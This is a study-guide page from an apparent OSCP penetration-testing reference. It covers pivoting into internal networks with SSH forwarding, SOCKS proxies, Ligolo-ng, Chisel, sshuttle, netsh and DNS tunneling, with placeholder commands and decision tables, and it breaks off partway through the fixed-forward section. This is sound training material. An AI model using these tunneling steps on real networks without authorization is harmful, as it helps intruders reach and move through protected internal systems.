Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details open><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details open><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/" aria-current="page">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="reach-internal-services">Reach internal services</h1>
+<p><a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | <a href="/oscp/notes/Master_Notes/">Master Notes</a> | <a href="/oscp/">Operational index</a> | <a href="/oscp/cheatsheets/">Cheatsheets</a></p>
+<p>A tunnel moves traffic; it does not grant destination authorization. Draw listener location, connection initiator, remote destination, DNS resolution and return path separately.</p>
+<p><strong>Speedrun blocks:</strong> 13; study fundamentals before 10–12. <strong>Documented methods:</strong> 16.</p>
+<p>Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.</p>
+<h2 id="first-pass-tools-and-findings">First pass: tools and findings</h2>
+<p>Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.</p>
+<h3 id="enumerate-what-the-pivot-can-actually-reach">Enumerate what the pivot can actually reach</h3>
+<p>Run route/listener checks on the pivot itself; do not infer its access from the attacker machine.</p>
+<pre><code class="language-bash">ip addr
+ip route
+ss -lntup
+</code></pre>
+<ul>
+<li><strong>If One internal TCP endpoint is reachable from the pivot:</strong> Draw the local/pivot listener and initiator before choosing a fixed forward. → <a href="/oscp/notes/methods/pivoting/#ssh-local">Forward a selected service through an SSH client-side listener</a>.</li>
+<li><strong>If Several internal services need proxy/routed access:</strong> Match the client protocol to SOCKS or a TUN route. → <a href="/oscp/notes/methods/pivoting/#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a>.</li>
+<li><strong>Otherwise:</strong> The pivot cannot reach the destination: fix that leg before adding a tunnel. → <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</li>
+</ul>
+<h3 id="use-ssh-forwarding-for-the-required-direction">Use SSH forwarding for the required direction</h3>
+<p>Use this when the attacker can SSH to a pivot that can reach the destination; remote forwarding reverses the listener placement.</p>
+<pre><code class="language-bash">ssh -N \
+  -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \
+  -p SSH_PORT USER@PIVOT \
+  -o ExitOnForwardFailure=yes \
+  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+</code></pre>
+<ul>
+<li><strong>If The forwarded service responds through the listener:</strong> Re-enumerate that destination with the matching service client. → <a href="/oscp/notes/methods/discovery/#identify-app">Identify applications and validate selected NSE checks</a>.</li>
+<li><strong>If Only the pivot can initiate the tunnel connection:</strong> Select the reverse/listener arrangement deliberately. → <a href="/oscp/notes/methods/pivoting/#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a>.</li>
+<li><strong>Otherwise:</strong> The listener exists but the app fails: test destination reachability and DNS through the chosen path. → <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</li>
+</ul>
+<h3 id="use-ligolo-for-a-justified-routed-requirement">Use Ligolo for a justified routed requirement</h3>
+<p>Use the version-specific agent/proxy procedure and route setup. A tunnel session alone is not a working destination route.</p>
+<pre><code class="language-bash">./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT
+</code></pre>
+<ul>
+<li><strong>If The selected subnet is routed and the destination responds:</strong> Re-run service discovery from that new position. → <a href="/oscp/notes/methods/discovery/#identify-app">Identify applications and validate selected NSE checks</a>.</li>
+<li><strong>If Delivery works but the payload callback fails:</strong> Build and verify the separately needed return/callback path. → <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</li>
+<li><strong>Otherwise:</strong> Route/session setup fails: inspect the route, interface privileges and each connection leg. → <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</li>
+</ul>
+<h2 id="discovery-workflow">Discovery workflow</h2>
+<p>Start from the pivot's current shell/process or accepted SSH access; another reachable subnet and an operational tunnel are not assumed.</p>
+<p>Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.</p>
+<ol>
+<li>Inspect pivot interfaces, routes, local listeners and destination reachability: <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</li>
+<li>Draw listener location and connection initiator before fixed or SSH forwarding: <a href="/oscp/notes/methods/pivoting/#fixed-forward">Relay a single TCP service through a fixed forward</a>; <a href="/oscp/notes/methods/pivoting/#ssh-local">Forward a selected service through an SSH client-side listener</a>; <a href="/oscp/notes/methods/pivoting/#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a>.</li>
+<li>Choose proxy versus routed access according to the real client/protocol requirements: <a href="/oscp/notes/methods/pivoting/#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a>; <a href="/oscp/notes/methods/pivoting/#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>; <a href="/oscp/notes/methods/pivoting/#ligolo-route">Route a selected internal subnet through Ligolo-ng</a>.</li>
+<li>Validate names, KDC access and the separately required delivery/callback route: <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</li>
+<li>For additional hops test each leg before chaining the final application: <a href="/oscp/notes/methods/pivoting/#pivot-multihop">Compose multiple pivots and validate every connection leg</a>.</li>
+</ol>
+<p><strong>Decision rule:</strong> an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.</p>
+<h2 id="method-families">Method families</h2>
+<ul>
+<li><strong>Network position and fixed relays:</strong> <a href="#pivot-state">Discover pivot interfaces, routes and internal service context</a>, <a href="#fixed-forward">Relay a single TCP service through a fixed forward</a>.</li>
+<li><strong>SSH listener direction and proxy access:</strong> <a href="#ssh-local">Forward a selected service through an SSH client-side listener</a>, <a href="#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a>, <a href="#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a>, <a href="#ssh-remote-dynamic">Expose a server-side SOCKS proxy through remote dynamic SSH forwarding</a>, <a href="#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>.</li>
+<li><strong>Transparent and Windows forwarding:</strong> <a href="#sshuttle-route">Route a selected subnet through sshuttle</a>, <a href="#windows-forward">Forward from Windows with OpenSSH, Plink or Netsh</a>.</li>
+<li><strong>Alternative carriers and routed agents:</strong> <a href="#chisel-reverse">Use a reverse Chisel SOCKS or fixed TCP tunnel</a>, <a href="#chisel-forward">Use forward Chisel SOCKS and version-supported UDP routing</a>, <a href="#ligolo-route">Route a selected internal subnet through Ligolo-ng</a>, <a href="#pivot-dns-tunnel">Conditional: tunnel through controlled DNS infrastructure</a>.</li>
+<li><strong>Names, return paths and multiple hops:</strong> <a href="#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>, <a href="#pivot-callback">Build the callback and delivery routes separately from the attack route</a>, <a href="#pivot-multihop">Compose multiple pivots and validate every connection leg</a>.</li>
+</ul>
+<h2 id="choose-a-method">Choose a method</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Recognition clue</th><th>Required access</th><th>Enabling conditions</th><th>Resulting capability</th></tr></thead><tbody><tr><td><a href="#pivot-state">Discover pivot interfaces, routes and internal service context</a></td><td>A foothold exposes an interface/subnet or a loopback-only service</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>A usable pivot process/identity and explicit scope; both forward and return directions must be understood</td><td>A route diagram identifying listener, initiator, pivot destination and protocol</td></tr><tr><td><a href="#fixed-forward">Relay a single TCP service through a fixed forward</a></td><td>One reachable pivot can connect to one internal TCP destination</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity</td><td>A reachable local/pivot port carrying one destination service</td></tr><tr><td><a href="#ssh-local">Forward a selected service through an SSH client-side listener</a></td><td>SSH reaches a server that can access the needed internal service</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route</td><td>A client-side port carrying the chosen internal TCP service</td></tr><tr><td><a href="#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a></td><td>Several internal TCP services need access through one SSH server</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>SSH forwarding allowed and clients that support SOCKS or compatible interception; DNS behavior must be chosen explicitly</td><td>A client-side SOCKS proxy for selected destination connections</td></tr><tr><td><a href="#ssh-remote">Expose an SSH-client-side destination through a server-side remote listener</a></td><td>The useful side can initiate SSH outward but cannot accept an inbound management connection</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination</td><td>A server-side listener forwarding to a destination reached from the SSH client</td></tr><tr><td><a href="#ssh-remote-dynamic">Expose a server-side SOCKS proxy through remote dynamic SSH forwarding</a></td><td>Only the pivot can initiate SSH, but several client-selected internal destinations are needed</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>A supporting OpenSSH client, allowed remote forwarding, listener binding and SOCKS-compatible tool clients</td><td>A server-side SOCKS listener whose connections exit from the SSH client/pivot</td></tr><tr><td><a href="#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a></td><td>A SOCKS listener or an SSH jump host is already available</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Client/proxy transport compatibility, correct proxy configuration and controlled name resolution</td><td>A verified application connection through the chosen proxy/jump</td></tr><tr><td><a href="#sshuttle-route">Route a selected subnet through sshuttle</a></td><td>Multiple internal TCP destinations need transparent application access over SSH</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Working SSH/Python environment, local routing/firewall privileges and explicitly selected supported traffic/subnets</td><td>A verified transparent route for the chosen supported traffic</td></tr><tr><td><a href="#windows-forward">Forward from Windows with OpenSSH, Plink or Netsh</a></td><td>The pivot is Windows and available networking utilities constrain the route</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Compatible OpenSSH/Plink authentication or administrative Netsh/IP Helper context; correct listener and destination paths</td><td>A selected TCP service reachable through the Windows pivot</td></tr><tr><td><a href="#chisel-reverse">Use a reverse Chisel SOCKS or fixed TCP tunnel</a></td><td>A pivot can make outbound HTTP/WebSocket connections to the tunnel server</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Compatible reviewed client/server, server reverse mode, reachable server port and pivot-to-destination access</td><td>A server-side SOCKS or fixed-port route into pivot-reachable services</td></tr><tr><td><a href="#chisel-forward">Use forward Chisel SOCKS and version-supported UDP routing</a></td><td>The assessment-side client can reach a pivot-side tunnel server</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Compatible client/server roles, reachable carrier, correctly placed SOCKS listener and explicitly supported UDP-aware mode when required</td><td>A forward proxy route with documented TCP/UDP behavior</td></tr><tr><td><a href="#ligolo-route">Route a selected internal subnet through Ligolo-ng</a></td><td>Several protocols/subnets require a route-style interface through an agent</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet</td><td>A verified routed connection path including supported loopback/listener features</td></tr><tr><td><a href="#pivot-dns-tunnel">Conditional: tunnel through controlled DNS infrastructure</a></td><td>DNS is an available carrier while simpler permitted routes are unavailable</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution</td><td>A verified constrained DNS carrier and its explicitly configured access capabilities</td></tr><tr><td><a href="#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a></td><td>An IP connection works while hostname/Kerberos access fails</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time</td><td>A route-compatible name and authentication context</td></tr><tr><td><a href="#pivot-callback">Build the callback and delivery routes separately from the attack route</a></td><td>A pivoted exploit reaches its target but its shell/download cannot return</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward</td><td>A verified return or file-delivery path for the selected execution chain</td></tr><tr><td><a href="#pivot-multihop">Compose multiple pivots and validate every connection leg</a></td><td>A second internal network is reachable only from a later foothold</td><td>A pivot identity/process or reachable SSH service and a drawn source-to-destination path</td><td>A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths</td><td>A verified selected route across multiple source positions</td></tr></tbody></table>
+<p><a id="pivot-state"></a></p>
+<h2 id="discover-pivot-interfaces-routes-and-internal-service-context">Discover pivot interfaces, routes and internal service context</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#1-draw-the-route-before-choosing-a-command">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#2-discover-the-pivots-network-position">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#3-choose-the-smallest-compatible-route">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#16-verification-and-cleanup">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result">1. Purpose and result</h3>
+<p>A route diagram identifying listener, initiator, pivot destination and protocol.</p>
+<h3 id="2-recognition-clues">2. Recognition clues</h3>
+<p>A foothold exposes an interface/subnet or a loopback-only service.</p>
+<h4 id="find-the-clue-from-your-starting-access">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> On the foothold inspect interfaces/routes and local listeners, then test an explicitly assigned destination from that host.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ip addr
+ip route
+ss -lntup
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">INTERFACE_A: current network
+INTERFACE_B: assigned internal network
+Listener: 127.0.0.1:PORT
+</code></pre>
+<p><strong>Recognize this detail:</strong> A second network or loopback listener supplies a new vantage candidate; forwarding is not automatically enabled.</p>
+<p><strong>Still missing before method selection:</strong> Read interfaces/routes/listeners on the pivot and probe the internal destination from that host. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The pivot reaches the needed endpoint and a supported tunnel can carry the client: choose that route.</td></tr><tr><td>Ruled out in this context</td><td>The new subnet is outside assigned scope: do not use it as an attack route.</td></tr><tr><td>Inconclusive</td><td>Interface/route presence alone does not prove destination/firewall access.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> A usable pivot process/identity and explicit scope; both forward and return directions must be understood.</p>
+<h3 id="4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ip addr
+ip route
+ss -lntup
+</code></pre>
+<h3 id="5-why-it-works">5. Why it works</h3>
+<p>A dual-homed host can connect networks without forwarding packets for arbitrary clients. Select fixed forward, application proxy or routed tunnel according to the required protocol and permissions.</p>
+<h3 id="6-execute-and-choose-variants">6. Execute and choose variants</h3>
+<pre><code class="language-text">APPLICATION TOOL
+  -> local listener / SOCKS endpoint / TUN route
+  -> tunnel transport endpoint
+  -> pivot exit
+  -> internal destination service
+
+CALLBACK TARGET
+  -> pivot listener or routable address
+  -> relay/tunnel
+  -> final listener
+</code></pre>
+<p>Record:</p>
+<pre><code class="language-text">TOOL_HOST -> ENTRY_SOCKET/ROUTE -> TRANSPORT -> PIVOT -> DESTINATION
+application protocol | TCP/UDP | initiator | bind address | DNS point
+credential/SPN name | callback route | privilege | cleanup objects
+</code></pre>
+<p>Do not use “pivot works” as a single state. Confirm these layers separately:</p>
+<ol>
+<li>the tunnel process started;</li>
+<li>its listener/transport connection exists;</li>
+<li>the pivot can reach the intended destination socket;</li>
+<li>the local route, forward or proxy points at the right exit;</li>
+<li>the application actually uses that path;</li>
+<li>name resolution and authentication match the application;</li>
+<li>a callback, if required, has its own return path.</li>
+</ol>
+<p>Linux:</p>
+<pre><code class="language-bash">id
+ip -brief address
+ip route
+ip neigh
+ss -lntup
+cat /etc/resolv.conf
+</code></pre>
+<p>Windows:</p>
+<pre><code class="language-cmd">whoami /all
+ipconfig /all
+route print
+arp -a
+netstat -ano
+</code></pre>
+<p>PowerShell selected endpoints:</p>
+<pre><code class="language-powershell">Get-NetIPConfiguration
+Get-NetRoute -AddressFamily IPv4 | Sort-Object DestinationPrefix,RouteMetric
+Get-NetTCPConnection -State Listen
+Get-DnsClientServerAddress -AddressFamily IPv4
+</code></pre>
+<blockquote>
+<p>An interface or route proves a possible network position, not destination reachability. Validate one justified socket from the pivot before building a tunnel.</p>
+</blockquote>
+<pre><code class="language-bash">nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT
+curl -v --connect-timeout 5 http://INTERNAL_HOST:INTERNAL_PORT/
+</code></pre>
+<pre><code class="language-powershell">Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Need</th><th>Baseline</th><th>Choose when</th><th>Main limitation</th></tr></thead><tbody><tr><td>One TCP service through an SSH pivot</td><td>SSH local forward</td><td>Kali can initiate SSH to pivot</td><td>One destination socket per forward</td></tr><tr><td>Many TCP destinations through SSH pivot</td><td>SSH dynamic forward</td><td>Kali can initiate SSH to pivot</td><td>SOCKS/client compatibility</td></tr><tr><td>Pivot can connect outward but inbound access is blocked</td><td>SSH remote or remote-dynamic forward</td><td>Pivot has OpenSSH client and can reach Kali SSH</td><td>Kali SSH policy; OpenSSH version for remote dynamic</td></tr><tr><td>SSH hop directly to internal SSH</td><td><code>ProxyJump</code></td><td>Both pivot and destination provide SSH</td><td>SSH-only path</td></tr><tr><td>Simple Linux TCP relay</td><td>Socat</td><td>Binary already exists and listener can be exposed</td><td>Clear TCP relay; no authentication/encryption</td></tr><tr><td>Transparent selected subnets through SSH</td><td>sshuttle</td><td>Suitable SSH server with Python; local privileges</td><td>TCP/DNS-oriented, local firewall changes</td></tr><tr><td>Windows SSH-based forward</td><td>Built-in <code>ssh.exe</code> or Plink</td><td>Compatible client exists and outbound SSH works</td><td>Server policy and credential/host-key handling</td></tr><tr><td>Windows native fixed TCP relay</td><td><code>netsh interface portproxy</code></td><td>Elevated token; target modification acceptable</td><td>TCP only; firewall/IP Helper/stateful cleanup</td></tr><tr><td>Outbound HTTP/WebSocket-shaped tunnel</td><td>Chisel</td><td>Pivot can run matching binary and reach server</td><td>Client/server compatibility and proxy/client transport limits</td></tr><tr><td>Routed access for ordinary clients</td><td>Ligolo-ng</td><td>Agent can reach proxy and TUN/route setup is possible</td><td>Userland stack is not identical to direct raw networking</td></tr><tr><td>DNS is the only viable egress</td><td>dnscat2</td><td>DNS path plus authoritative/direct server control</td><td>Slow/noisy, infrastructure and client required</td></tr></tbody></table>
+<p>Prefer one explicit forward for one known service. Use SOCKS when several TCP endpoints must be explored. Use a routed pivot when many ordinary tools must operate without proxy wrappers. Do not add a multi-host route when command execution directly on the pivot is sufficient.</p>
+<p>Kali/Linux:</p>
+<pre><code class="language-bash">ss -lntup
+ip -brief address
+ip route
+ps -ef | grep -E '[s]sh .*-[LDR]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle'
+</code></pre>
+<p>Windows:</p>
+<pre><code class="language-cmd">netstat -ano
+tasklist
+netsh interface portproxy show all
+netsh advfirewall firewall show rule name="OSCP Pivot LOCAL_PORT"
+</code></pre>
+<p>Record:</p>
+<ul>
+<li>exact process/command and version;</li>
+<li>bind address and port;</li>
+<li>transport direction and initiator;</li>
+<li>pivot and destination;</li>
+<li>routes/name mappings/configuration files added;</li>
+<li>simple TCP proof and final application proof;</li>
+<li>callback proof where applicable;</li>
+<li>cleanup command and result.</li>
+</ul>
+<p>Stop tunnel processes and remove TUN routes, Ligolo listeners, temporary mappings, password files, Netsh rules and firewall exceptions after the authorized task.</p>
+<h3 id="7-worked-example--hypothetical">7. Worked example — hypothetical</h3>
+<p>Observation: a foothold can reach an internal service absent from Kali's route. Test: verify the destination from that host and draw the connection direction. Illustrative output: the pivot reaches TCP/445. Interpretation: choose the smallest compatible route for the intended client.</p>
+<h3 id="8-verify-the-result">8. Verify the result</h3>
+<p>Record source, pivot, destination, protocol, listener placement and required return path.</p>
+<h3 id="9-failure-and-fallback">9. Failure and fallback</h3>
+<p>Interface presence is not proof of destination reachability. Routing/firewall and application permission are independent.</p>
+<h3 id="10-next-transitions">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#fixed-forward">Relay a single TCP service through a fixed forward</a>; <a href="/oscp/notes/methods/pivoting/#ssh-local">Forward a selected service through an SSH client-side listener</a>; <a href="/oscp/notes/methods/pivoting/#chisel-reverse">Use a reverse Chisel SOCKS or fixed TCP tunnel</a>; <a href="/oscp/notes/methods/pivoting/#ligolo-route">Route a selected internal subnet through Ligolo-ng</a>; <a href="/oscp/notes/methods/pivoting/#ssh-remote-dynamic">Expose a server-side SOCKS proxy through remote dynamic SSH forwarding</a>; <a href="/oscp/notes/methods/pivoting/#sshuttle-route">Route a selected subnet through sshuttle</a>; <a href="/oscp/notes/methods/pivoting/#windows-forward">Forward from Windows with OpenSSH, Plink or Netsh</a>; <a href="/oscp/notes/methods/pivoting/#chisel-forward">Use forward Chisel SOCKS and version-supported UDP routing</a>; <a href="/oscp/notes/methods/pivoting/#pivot-multihop">Compose multiple pivots and validate every connection leg</a>.</p>
+<p><a id="fixed-forward"></a></p>
+<h2 id="relay-a-single-tcp-service-through-a-fixed-forward">Relay a single TCP service through a fixed forward</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#4-socat-fixed-tcp-relay">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-1">1. Purpose and result</h3>
+<p>A reachable local/pivot port carrying one destination service.</p>
+<h3 id="2-recognition-clues-1">2. Recognition clues</h3>
+<p>One reachable pivot can connect to one internal TCP destination.</p>
+<h4 id="find-the-clue-from-your-starting-access-1">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From pivot-state evidence identify one fixed TCP destination and where the assessment client can reach a pivot listener.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ip route get TARGET
+ss -lnt
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Pivot -> internal TARGET:PORT: verified
+Assessment source -> pivot listener: candidate
+Needed protocol: TCP, one fixed destination
+</code></pre>
+<p><strong>Recognize this detail:</strong> A single TCP service can fit a fixed relay without assuming a full routed network.</p>
